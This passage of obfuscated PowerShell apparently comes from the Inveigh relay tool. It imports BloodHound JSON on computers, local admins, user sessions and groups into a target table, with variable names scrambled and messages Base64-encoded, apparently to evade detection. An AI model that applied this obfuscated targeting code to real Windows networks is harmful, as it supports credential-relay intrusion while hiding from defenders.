                    Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAGMAbwBtAHAAdQB0AGUAcgBzAA=='))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAxADAAMQAxADEAMAB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${10101010011101110} -ErrorAction SilentlyContinue
                }
                ${00111111010101101}.Reset()
                ${00111111010101101}.Start()
            }
            ${_01011101001101001} = $_.Name
            [Array]${01001110000101000} = $_.LocalAdmins | ? {$_.Type -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))} | select -expand Name
            [Array]${00101011001011001} = $_.LocalAdmins | ? {$_.Type -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))} | select -expand Name
            if($DNS)
            {
                $IP = _01111111111000111 ${_01011101001101001}
                if(!$IP)
                {
                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABEAE4AUwAgAGwAbwBvAGsAdQBwACAAZgBvAHIAIAAkAHsAXwAwADEAMAAxADEAMQAwADEAMAAwADEAMQAwADEAMAAwADEAfQAgAGYAYQBpAGwAZQBkAA==')))
                }
            }
            if(!${10110100010010100})
            {
                for(${01100001111100111} = 0;${01100001111100111} -lt ${00101000010000101}.enumerate.Count;${01100001111100111}++)
                {
                    if((${_01011101001101001} -and ${00101000010000101}.enumerate[${01100001111100111}].Hostname -eq ${_01011101001101001}) -or ($IP -and ${00101000010000101}.enumerate[${01100001111100111}].IP -eq $IP))
                    {
                        if(${00101000010000101}.enumerate[${01100001111100111}].Hostname -ne ${_01011101001101001} -and ${00101000010000101}.enumerate[${01100001111100111}].IP -eq $IP)
                        {
                            for(${00111010100111110} = 0;${00111010100111110} -lt ${00101000010000101}.enumerate.Count;${00111010100111110}++)
                            {
                                if(${00101000010000101}.enumerate[${00111010100111110}].IP -eq $target)
                                {
                                    ${00000100011010011} = ${00111010100111110}
                                    break
                                }
                            }
                            ${00101000010000101}.enumerate[${00000100011010011}].Hostname = ${_01011101001101001}
                        }
                        else
                        {
                            for(${00111010100111110} = 0;${00111010100111110} -lt ${00101000010000101}.enumerate.Count;${00111010100111110}++)
                            {
                                if(${00101000010000101}.enumerate[${00111010100111110}].Hostname -eq ${_01011101001101001})
                                {
                                    ${00000100011010011} = ${00111010100111110}
                                    break
                                }
                            }
                        }
                        ${00101000010000101}.enumerate[${00000100011010011}]."Administrator Users" = ${01001110000101000}
                        ${00101000010000101}.enumerate[${00000100011010011}]."Administrator Groups" = ${00101011001011001}
                    }
                    else
                    {
                        ${00101000010000101}.enumerate.Add((_01100101100001011 -_01011101001101001 $_.Name -IP $IP -_10010101010010110 ${01001110000101000} -_01111001111010100 ${00101011001011001})) > $null
                    }
                }
            }
            else
            {
                ${00101000010000101}.enumerate.Add((_01100101100001011 -_01011101001101001 $_.Name -IP $IP -_10010101010010110 ${01001110000101000} -_01111001111010100 ${00101011001011001})) > $null
            }
            $IP = $null
            ${_01011101001101001} = $null
            ${01001110000101000} = $null
            ${00101011001011001} = $null
            ${00000100011010011} = $null
            ${01100001111100111}++
        }
        echo "[+] Import completed in $([Math]::Truncate(${00101101000101101}.Elapsed.TotalSeconds)) seconds"
        ${00101101000101101}.Reset()
        rv bloodhound_computers
    }
    if($Sessions)
    {
        $Sessions = (rvpa $Sessions).Path
        ${01111001101110111} = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        ${01111001101110111}.MaxJsonLength = 104857600
        ${01001111111111000} = [System.IO.File]::ReadAllText($Sessions)
        ${01001111111111000} = ${01111001101110111}.DeserializeObject(${01001111111111000})
        ${00101101000101101} = [System.Diagnostics.Stopwatch]::StartNew()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAAQgBsAG8AbwBkAEgAbwB1AG4AZAAgAFMAZQBzAHMAaQBvAG4AcwAgAEoAUwBPAE4A')))
        ${01001111111111000} = _10111100001101011 ${01001111111111000}
        echo "[+] Parsing completed in $([Math]::Truncate(${00101101000101101}.Elapsed.TotalSeconds)) seconds"
        ${00101101000101101}.Reset()
        ${00101101000101101}.Start()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAHMAZQBzAHMAaQBvAG4AcwAgAHQAbwAgAEkAbgB2AGUAaQBnAGgA')))
        ${00111111010101101} = [System.Diagnostics.Stopwatch]::StartNew()
        ${01100001111100111} = 0
        if(!${01001111111111000}.Sessions)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABKAFMATwBOACAAcwBlAHMAcwBpAG8AbgBzACAAcABhAHIAcwBlACAAZgBhAGkAbABlAGQA')))
            throw
        }
        ${01001111111111000}.Sessions | % {
            if(${00111111010101101}.Elapsed.TotalMilliseconds -ge 500)
            {
                ${10101010011101110} = [Math]::Truncate(${01100001111100111} / ${01001111111111000}.Sessions.Count * 100)
                if(${10101010011101110} -le 100)
                {
                    Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAHMAZQBzAHMAaQBvAG4AcwA='))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAxADAAMQAxADEAMAB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${10101010011101110} -ErrorAction SilentlyContinue
                }
                ${00111111010101101}.Reset()
                ${00111111010101101}.Start()
            }
            ${_01011101001101001} = $_.ComputerName
            if(${_01011101001101001} -as [IPAddress] -as [Bool])
            {
                $IP = ${_01011101001101001}
                ${_01011101001101001} = $null
                for(${01100001111100111} = 0;${01100001111100111} -lt ${00101000010000101}.enumerate.Count;${01100001111100111}++)
                {
                    if(${00101000010000101}.enumerate[${01100001111100111}].IP -eq $target)
                    {
                        ${00000100011010011} = ${01100001111100111}
                        break
                    }
                }
            }
            else
            {
                for(${01100001111100111} = 0;${01100001111100111} -lt ${00101000010000101}.enumerate.Count;${01100001111100111}++)
                {
                    if(${00101000010000101}.enumerate[${01100001111100111}].Hostname -eq ${_01011101001101001})
                    {
                        ${00000100011010011} = ${01100001111100111}
                        break
                    }
                }
                if($DNS)
                {
                    $IP = _01111111111000111 ${_01011101001101001}
                    if(!$IP)
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABEAE4AUwAgAGwAbwBvAGsAdQBwACAAZgBvAHIAIAAkAHsAXwAwADEAMAAxADEAMQAwADEAMAAwADEAMQAwADEAMAAwADEAfQAgAGYAYQBpAGwAZQBkACAAbwByACAASQBQAHYANgAgAGEAZABkAHIAZQBzAHMA')))
                    }
                }
            }
            if(!${10110100010010100} -or ${00000100011010011} -ge 0)
            {
                [Array]${10010010000111011} = ${00101000010000101}.enumerate[${00000100011010011}].Sessions
                if(${10010010000111011} -notcontains $_.UserName)
                {
                    ${10010010000111011} += $_.UserName
                    ${00101000010000101}.enumerate[${00000100011010011}].Sessions = ${10010010000111011}
                }
            }
            else
            {   
                ${00101000010000101}.enumerate.Add($(_01100101100001011 -_01011101001101001 ${_01011101001101001} -IP $IP -Sessions $_.UserName)) > $null
            }
            ${_01011101001101001} = $null
            $IP = $null
            ${10010010000111011} = $null
            ${00000100011010011} = $null
            ${01100001111100111}++
        }
        echo "[+] Import completed in $([Math]::Truncate(${00101101000101101}.Elapsed.TotalSeconds)) seconds"
        ${00101101000101101}.Reset()
        rv bloodhound_sessions
    }
    if($Groups)
    {
        $Groups = (rvpa $Groups).Path
        ${00001010101011101} = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        ${00001010101011101}.MaxJsonLength = 104857600
        ${01011111001010101} = [System.IO.File]::ReadAllText($Groups)
        ${01011111001010101} = ${00001010101011101}.DeserializeObject(${01011111001010101})
        ${00101101000101101} = [System.Diagnostics.Stopwatch]::StartNew()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAAQgBsAG8AbwBkAEgAbwB1AG4AZAAgAEcAcgBvAHUAcABzACAASgBTAE8ATgA=')))
        ${01011111001010101} = _10111100001101011 ${01011111001010101}
        echo "[+] Parsing completed in $([Math]::Truncate(${00101101000101101}.Elapsed.TotalSeconds)) seconds"
        ${00101101000101101}.Reset()
        ${00101101000101101}.Start()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAGcAcgBvAHUAcABzACAAdABvACAASQBuAHYAZQBpAGcAaAA=')))
        ${00111111010101101} = [System.Diagnostics.Stopwatch]::StartNew()
        ${01100001111100111} = 0
        if(!${01011111001010101}.Groups)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABKAFMATwBOACAAZwByAG8AdQBwAHMAIABwAGEAcgBzAGUAIABmAGEAaQBsAGUAZAA=')))
            throw
        }
        ${01011111001010101}.Groups | % {
            if(${00111111010101101}.Elapsed.TotalMilliseconds -ge 500)
            {
                ${10101010011101110} = [Math]::Truncate(${01100001111100111} / ${01011111001010101}.Groups.Count * 100)
                if(${10101010011101110} -le 100)
                {
                    Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAGcAcgBvAHUAcABzAA=='))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAxADAAMQAxADEAMAB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${10101010011101110} -ErrorAction SilentlyContinue
                }
                ${00111111010101101}.Reset()
                ${00111111010101101}.Start()
            }
            [Array]${00111001100001011} = $_.Members | select -expand MemberName
            ${00101000010000101}.group_table.Add($_.Name,${00111001100001011})
            ${00111001100001011} = $null
            ${01100001111100111}++
        }
        echo "[+] Import completed in $([Math]::Truncate($stopwatch.Elapsed.TotalSeconds)) seconds"
    }
}

